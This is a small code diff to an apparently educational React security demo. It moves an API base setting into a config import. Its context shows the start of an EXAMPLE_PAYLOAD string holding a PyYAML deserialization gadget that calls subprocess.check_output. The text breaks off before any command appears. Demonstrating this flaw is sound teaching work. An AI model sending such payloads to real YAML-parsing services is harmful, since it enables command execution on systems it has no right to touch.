@@ -1,5 +1,5 @@
 import React, { useState, useRef, useEffect } from 'react';
-
+import { API_BASE } from './apiConfig';
 // ── A06 color palette — matches A06.jsx / Home's a06 accent (#b388ff)
 const T      = '#b388ff';
 const BG     = '#0a0f1e';
@@ -9,8 +9,6 @@ const C3     = '#2a2450';
 const MUTED  = '#5a5478';
 const BODY   = '#a89cc8';
 const BRIGHT = '#ece8fa';
-
-const API_BASE = ''; // same-origin; Flask dev server proxied or CORS-enabled
 
 const EXAMPLE_PAYLOAD = `
 exploit: !!python/object/apply:subprocess.check_output
